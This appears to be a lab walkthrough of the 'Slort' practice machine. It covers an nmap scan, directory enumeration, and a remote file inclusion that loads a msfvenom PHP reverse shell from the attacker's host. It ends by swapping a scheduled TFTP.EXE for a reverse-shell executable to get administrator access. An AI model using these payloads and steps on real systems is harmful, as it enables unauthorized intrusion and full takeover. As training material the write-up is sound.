## NMAP
```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql         syn-ack ttl 125 MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.218.53:4443/dashboard/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8080/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.218.53:8080/dashboard/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12156/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36201/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18778/udp): CLEAN (Timeout)
|   Check 4 (port 59480/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-03-13T14:01:41
|_  start_date: N/A
```

## 21 FTP
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ nxc ftp 192.168.218.53 -u anonymous -p anonymous
FTP         192.168.218.53  21     192.168.218.53   [-] anonymous:anonymous (Response:530 Login or password incorrect!)
```

## 445 SMB
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ nxc smb 192.168.218.53 -u anonymous -p anonymous
SMB         192.168.218.53  445    SLORT            [*] Windows 10 / Server 2019 Build 19041 x64 (name:SLORT) (domain:slort) (signing:False) (SMBv1:None)
SMB         192.168.218.53  445    SLORT            [-] slort\anonymous:anonymous STATUS_LOGON_FAILURE 
```

## 4443 HTTP
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ dirsearch -u http://192.168.218.53:4443
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/Pen200/Slort/reports/http_192.168.218.53_4443/_26-03-13_10-07-00.txt

Target: http://192.168.218.53:4443/

[10:07:00] Starting: 
[10:07:01] 403 -    1KB - /%C0%AE%C0%AE%C0%AF                               
[10:07:01] 403 -    1KB - /%3f/
[10:07:01] 403 -    1KB - /%ff                                              
[10:07:04] 403 -    1KB - /.ht_wsr.txt                                      
[10:07:04] 403 -    1KB - /.htaccess.sample                                 
[10:07:04] 403 -    1KB - /.htaccess.bak1
[10:07:04] 403 -    1KB - /.htaccess.orig                                   
[10:07:04] 403 -    1KB - /.htaccess_extra
[10:07:04] 403 -    1KB - /.htaccess.save
[10:07:04] 403 -    1KB - /.htaccess_sc
[10:07:04] 403 -    1KB - /.htaccess_orig
[10:07:04] 403 -    1KB - /.htaccessBAK
[10:07:04] 403 -    1KB - /.htaccessOLD
[10:07:04] 403 -    1KB - /.htaccessOLD2
[10:07:04] 403 -    1KB - /.htm                                             
[10:07:04] 403 -    1KB - /.html
[10:07:04] 403 -    1KB - /.httr-oauth                                      
[10:07:04] 403 -    1KB - /.htpasswds
[10:07:04] 403 -    1KB - /.htpasswd_test                                   
[10:07:27] 403 -    1KB - /cgi-bin/                                         
[10:07:27] 500 -    1KB - /cgi-bin/printenv.pl                              
[10:07:29] 301 -  351B  - /dashboard  ->  http://192.168.218.53:4443/dashboard/
[10:07:29] 200 -    6KB - /dashboard/howto.html                             
[10:07:29] 200 -    7KB - /dashboard/
[10:07:30] 200 -   31KB - /dashboard/faq.html                               
[10:07:30] 200 -   78KB - /dashboard/phpinfo.php                            
[10:07:32] 403 -    1KB - /error/                                           
[10:07:33] 200 -   30KB - /favicon.ico                                      
[10:07:34] 503 -    1KB - /examples/                                        
[10:07:34] 503 -    1KB - /examples/servlet/SnoopServlet
[10:07:34] 503 -    1KB - /examples/websocket/index.xhtml
[10:07:34] 503 -    1KB - /examples/jsp/index.html
[10:07:34] 503 -    1KB - /examples                                         
[10:07:34] 503 -    1KB - /examples/servlets/index.html
[10:07:34] 503 -    1KB - /examples/jsp/snp/snoop.jsp
[10:07:34] 503 -    1KB - /examples/servlets/servlet/CookieExample          
[10:07:34] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[10:07:34] 503 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[10:07:37] 301 -  345B  - /img  ->  http://192.168.218.53:4443/img/         
[10:07:37] 403 -    1KB - /index.php::$DATA                                 
[10:07:45] 403 -    1KB - /phpmyadmin                                       
[10:07:46] 403 -    1KB - /phpmyadmin/                                      
[10:07:46] 403 -    1KB - /phpmyadmin/ChangeLog
[10:07:46] 403 -    1KB - /phpmyadmin/docs/html/index.html
[10:07:46] 403 -    1KB - /phpmyadmin/doc/html/index.html
[10:07:46] 403 -    1KB - /phpmyadmin/phpmyadmin/index.php                  
[10:07:46] 403 -    1KB - /phpmyadmin/README
[10:07:46] 403 -    1KB - /phpmyadmin/index.php
[10:07:46] 403 -    1KB - /phpmyadmin/scripts/setup.php                     
[10:07:50] 403 -    1KB - /server-info                                      
[10:07:50] 403 -    1KB - /server-status/                                   
[10:07:50] 403 -    1KB - /server-status
[10:07:51] 301 -  346B  - /site  ->  http://192.168.218.53:4443/site/       
[10:07:51] 301 -   27B  - /site/  ->  index.php?page=main.php               
[10:08:00] 403 -    1KB - /Trace.axd::$DATA                                 
[10:08:03] 403 -    1KB - /web.config::$DATA                                
[10:08:03] 403 -    1KB - /webalizer                                        
[10:08:03] 403 -    1KB - /webalizer/                                       
[10:08:03] 200 -  782B  - /Webalizer/
[10:08:04] 200 -  774B  - /xampp/                                           
                                                                             
Task Completed
```
![image](https://hackmd.io/_uploads/H17wn5Z9be.png)

`http://192.168.218.53:4443/site/index.php?page=http://192.168.45.235/rev.php`
1. cmd webshell(got redirect after execute)
![image](https://hackmd.io/_uploads/SySd39W5-l.png)

2. msfvenom
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ msfvenom -p php/reverse_php LHOST=192.168.45.235 LPORT=4444 -o rev.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2647 bytes
Saved as: rev.php
```
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.235] from (UNKNOWN) [192.168.218.53] 50996

whoami
slort\rupert
```

## Privilege Escalation
```
PS C:\Users\rupert> ls c:\
ls c:\


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                             
----                 -------------         ------ ----                                                             
d-----         7/20/2020   7:08 AM                Backup                                                           
d-----         12/7/2019   1:14 AM                PerfLogs                                                         
d-r---          5/4/2022   1:06 AM                Program Files                                                    
d-r---         12/3/2021   8:22 AM                Program Files (x86)                                              
d-r---         12/3/2021   8:29 AM                Users                                                            
d-----          5/4/2022   1:52 AM                Windows                                                          
d-----         6/12/2020   8:11 AM                xampp                                                            
-a----         3/13/2026   6:55 AM           2693 output.txt                                                       


PS C:\Users\rupert> ls c:\backup
ls c:\backup


    Directory: C:\backup


Mode                 LastWriteTime         Length Name                                                             
----                 -------------         ------ ----                                                             
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                       
-a----         6/12/2020   7:45 AM             73 info.txt                                                         
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE                                                         


PS C:\Users\rupert> cd c:\backup
cd c:\backup
PS C:\backup> net use m: \\192.168.45.235\share /user:jojomojo jojomojo
net use m: \\192.168.45.235\share /user:jojomojo jojomojo
The command completed successfully.

PS C:\backup> cd ..
cd ..
PS C:\> copy backup m:\
copy backup m:\
PS C:\> copy backup/* m:\
copy backup/* m:\

```
```info.txt
info.txt:

Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4445 -f exe -o reverse1.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse1.exe
```
```
PS C:\backup> mv TFTP.EXE TFTP_.exe       
mv TFTP.EXE TFTP_.exe
PS C:\backup> ls
ls


    Directory: C:\backup


Mode                 LastWriteTime         Length Name                                                             
----                 -------------         ------ ----                                                             
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                       
-a----         6/12/2020   7:45 AM             73 info.txt                                                         
-a----         6/23/2020   7:49 PM          73802 TFTP_.exe                                                        


PS C:\backup> ls m:\
ls m:\


    Directory: m:\


Mode                 LastWriteTime         Length Name                                                             
----                 -------------         ------ ----                                                             
d-----         3/13/2026   7:07 AM                reports                                                          
d-----         3/13/2026   7:40 AM                backup                                                           
-a----         3/13/2026   7:21 AM           2647 shell.php                                                        
-a----         3/13/2026   7:19 AM           2588 rev.php                                                          
-a----         3/13/2026   7:21 AM           7680 reverse.exe                                                      
-a----         3/13/2026   7:51 AM           7680 reverse1.exe                                                     


PS C:\backup> copy m:\reverse1.exe TFTP.EXE
copy m:\reverse1.exe TFTP.EXE
```
```
┌──(kali㉿kali)-[~/Desktop/Pen200/Slort]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.45.235] from (UNKNOWN) [192.168.218.53] 51018
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator

C:\WINDOWS\system32>
```